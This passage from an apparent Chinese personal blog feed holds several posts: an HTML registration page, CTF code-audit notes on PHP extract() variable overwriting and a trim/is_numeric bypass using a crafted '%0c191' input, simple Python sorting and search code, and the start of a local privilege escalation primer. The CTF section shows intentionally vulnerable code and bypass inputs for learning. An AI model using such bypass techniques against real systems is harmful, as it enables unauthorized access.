class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>注册页面设计：</p><ol><li>logo部分</li><li>导航栏</li><li>注册部分</li><li>页脚部分</li><li>网站声明信息</li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"3px"</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/logo2.png"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/header.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">href</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">href</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">href</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"black"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>手机数码<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>鞋靴箱包<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>电脑办公<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span>香烟香水<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">height</span>=<span class="string">"50px"</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"mui-input-clear"</span> <span class="attr">placeholder</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"aliceblue"</span>&gt;</span> 搜索<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">background</span>=<span class="string">"./img/regist_bg.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"2px"</span> <span class="attr">width</span>=<span class="string">"600px"</span>  <span class="attr">bgcolor</span>=<span class="string">azure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">"5"</span> <span class="attr">color</span>=<span class="string">"blue"</span>&gt;</span>会员注册<span class="tag">&lt;/<span class="name">font</span>&gt;</span> USER REGISTER<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>  <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"username"</span>  <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span>确认密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"username"</span>  <span class="attr">placeholder</span>=<span class="string">"请再次输入密码"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span>确认密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"username"</span>  <span class="attr">placeholder</span>=<span class="string">"请再次输入密码"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span>确认密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"username"</span>  <span class="attr">placeholder</span>=<span class="string">"请再次输入密码"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/footer.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">border</span>=<span class="string">"2px"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>copyright by @星晴<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>]]></content>
      
      
      
        <tags>
            
            <tag> web前端学习 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计--CTF</title>
      <link href="/2019/05/24/dai-ma-shen-ji/"/>
      <url>/2019/05/24/dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="1-extract变量覆盖漏洞"><a href="#1-extract变量覆盖漏洞" class="headerlink" title="1. extract变量覆盖漏洞"></a>1. extract变量覆盖漏洞</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">'xxx'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line"> &#123; </span><br><span class="line">    $content=trim(file_get_contents($flag));</span><br><span class="line">    <span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>; </span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当file_get_contents函数里面是一个不可读的路径，那么content的内容就是空，然后我们在初始化的时候将shiyan置空，那么$shiyan==$content就会成立，就会直接输出我们想要的内容。</p><h3 id="2-绕过空白字符"><a href="#2-绕过空白字符" class="headerlink" title="2. 绕过空白字符"></a>2. 绕过空白字符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">$info = <span class="string">""</span>; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</span><br><span class="line"> </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); <span class="comment">//为一个配置选项设置值</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭所有PHP错误报告</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="comment">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span></span><br><span class="line"> </span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); <span class="comment">//die — 等同于 exit()</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123;  <span class="comment">//foreach 语法结构提供了遍历数组的简单方式 </span></span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value);  <span class="comment">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span></span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); <span class="comment">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123; </span><br><span class="line">    $number = strval($number); <span class="comment">//strval — 获取变量的字符串值</span></span><br><span class="line">    $i = <span class="number">0</span>; </span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>; <span class="comment">//strlen — 获取字符串长度</span></span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123; </span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>])) <span class="comment">//is_numeric — 检测变量是否为数字或数字字符串 </span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>]))) <span class="comment">//intval — 获取变量的整数值</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </span><br><span class="line"> </span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line"> </span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>; </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $info;</span><br></pre></td></tr></table></figure><p>trim函数会移除空白，然后也会移除</p><ul><li>“\0” - NULL</li><li>“\t” - 制表符</li><li>“\n” - 换行</li><li>“\x0B” - 垂直制表符</li><li>“\r” - 回车</li><li>“ “ - 空格</li></ul><p><code>$value = trim($value)</code>之后$value为%0c191，四个字符，过滤了%00（NULL）<br> <code>addslashes</code>会添加反斜杠</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL<br><code>is_numeric</code>只是检测的是否是数字，01a就不是数字，0x1十六进制是，我们的是<br><code>is_numeric($_REQUEST[&#39;number&#39;])</code>这边是通过$_REQUEST[‘number’]进行判断，所以直接是false，然后进入下一个判断，下一个是判断是否是一个191，也就是开头首个数字和最后的数字是否相等，intval($req[‘number’])，$req[‘number’]是一个%0c191,然后intval之后就是191，这边如果是%00%0c191那么转换就是0这个时候是不相等的。他们两个不相等就会跳过去，然后最后得is_palindrome_number，这个函数时候number是%0c191是四个肯定是不对称所以跳过。</li></ul><h3 id="0x03-多重加密"><a href="#0x03-多重加密" class="headerlink" title="0x03 多重加密"></a>0x03 多重加密</h3><h3 id="0x04-sql注入-WITH-ROLLUP绕过"><a href="#0x04-sql注入-WITH-ROLLUP绕过" class="headerlink" title="0x04 sql注入_WITH ROLLUP绕过"></a>0x04 sql注入_WITH ROLLUP绕过</h3><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 代码审计 - </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>选择排序(简单题)</title>
      <link href="/2019/05/20/suan-fa-xuan-ze-pai-xu/"/>
      <url>/2019/05/20/suan-fa-xuan-ze-pai-xu/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pysnooper</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_select</span><span class="params">(mylist)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(mylist)):</span><br><span class="line">mix=mylist[i]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> mylist[i:]:</span><br><span class="line"><span class="keyword">if</span> j&lt;mix:</span><br><span class="line">mix=j</span><br><span class="line">index=mylist.index(mix)</span><br><span class="line">mylist[index],mylist[i]=mylist[i],mylist[index]</span><br><span class="line"><span class="keyword">return</span> mylist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">mylist=[<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">print(sort_select(mylist))</span><br></pre></td></tr></table></figure><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 算法 - </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分查找法</title>
      <link href="/2019/05/20/er-fen-cha-zhao-fa/"/>
      <url>/2019/05/20/er-fen-cha-zhao-fa/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find2</span><span class="params">(mylist,item)</span>:</span></span><br><span class="line">low=<span class="number">0</span></span><br><span class="line">high=len(mylist)<span class="number">-1</span></span><br><span class="line"><span class="keyword">while</span> low&lt;high:</span><br><span class="line">mid=(low+high)//<span class="number">2</span></span><br><span class="line">guess=mylist[mid]</span><br><span class="line"><span class="keyword">if</span> guess==item:</span><br><span class="line"><span class="keyword">return</span> mid</span><br><span class="line"><span class="keyword">elif</span> guess&lt;item:</span><br><span class="line">low=mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">high=mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">mylist=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">0</span>]</span><br><span class="line">print(find2(mylist,<span class="number">22</span>))</span><br></pre></td></tr></table></figure><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 算法 - </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地提权(一)</title>
      <link href="/2019/05/17/ben-di-ti-quan-ji-chu-zhi-shi/"/>
      <url>/2019/05/17/ben-di-ti-quan-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-本地提权"><a href="#0x01-本地提权" class="headerlink" title="0x01  本地提权"></a>0x01  本地提权</h3><p>条件：已经实现了本地低权限账号的登陆<br>        1.1 远程溢出<br>        1.2 直接获得账号密码<br>本地提权的目的就是希望获得更高的权限，对目标进一步的进行控制</p><h3 id="0x02-本地提权的基础知识"><a href="#0x02-本地提权的基础知识" class="headerlink" title="0x02 本地提权的基础知识"></a>0x02 本地提权的基础知识</h3><p>系统账户之间权限隔离</p><ol><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间(也划分了很多账号)</li></ol><hr><p>系统账号：</p><ul><li>用户账户登陆时获取权限令牌</li><li>服务账号无需用户登陆已经在后台启动服务(跟随系统启动而启动)</li></ul><hr><p>最高管理员账号:</p><ul><li>windows为==admininstrator==</li><li>linux为==root==<br>最高管理员可以生成很多应用账号，管理员赋给不同的权限，登陆的时候，系统赋予权限的令牌，令牌在登陆的时候绑定在用户会话上，每一次登陆的令牌不是一样的，随机.</li></ul><hr><p>不同系统默认的用户情况：</p><p>windwos:</p><ul><li>user</li><li>Administrator==有一些控制表项不能去修改和删除==</li><li>system 启动运行内核级别的权限(最高)</li></ul><p>administrator和system两个是相互包含的，</p><p><img src="/.com//1558059310908.drawio.html" alt="Diagram"></p><p>linux</p><ul><li>root=administrator+system</li><li>user</li></ul><hr><h3 id="0x03-windows操作系统的提权"><a href="#0x03-windows操作系统的提权" class="headerlink" title="0x03 windows操作系统的提权"></a>0x03 windows操作系统的提权</h3><ol><li>首先给windwos xp增加一个用户，由于我的xp是在域环境中，所以设置密码需要一个强的密码。<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35hzd0nzkj30z20ljdmz.jpg" alt><br>其中<code>net user xingqing *</code>修改用户的密码，<code>net user xingqing password</code>是增加一个用户xingqing.</li></ol><hr><ol start="2"><li><code>net user xingqing</code>查看当前xingqing ,<img src="http://ww1.sinaimg.cn/large/006d1Stply1g35ibb2xyfj30m80e4jta.jpg" alt>,可以看到它是属于当前的users组。Users是Windows中预设的一个用户组，介绍是：防止用户进行有意或无意的系统范围的更改，但是可以运行大部分应用程序。这个用户组包含了所有可登录的用户，默认权限是读取和执行（非系统分区）拒绝访问（所有System Volume Information文件夹及其子文件与子文件夹和其他用户配置文件夹）<br>读取和执行（系统分区下其他文件与文件夹）</li></ol><hr><ol start="3"><li>响应的用户权限以及组说明 <ul><li>Users<br>普通用户组，这个组的用户无法进行有意或无意的改动。因此，用户可以运行经过验证的应用程序，但不可以运行大多数旧版应用程序。Users 组是最安全的组，因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料。Users 组提供了一个最安全的程序运行环境。在经过 NTFS 格式化的卷上，默认安全设置旨在禁止该组的成员危及操作系统和已安装程序的完整性。用户不能修改系统注册表设置、操作系统文件或程序文件。Users 可以创建本地组，但只能修改自己创建的本地组。Users 可以关闭工作站，但不能关闭服务器。</li></ul></li></ol><ul><li>Power Users<br>高级用户组，Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。分配给 Power Users 组的默认权限允许 Power Users 组的成员修改整个计算机的设置。但Power Users 不具有将自己添加到 Administrators 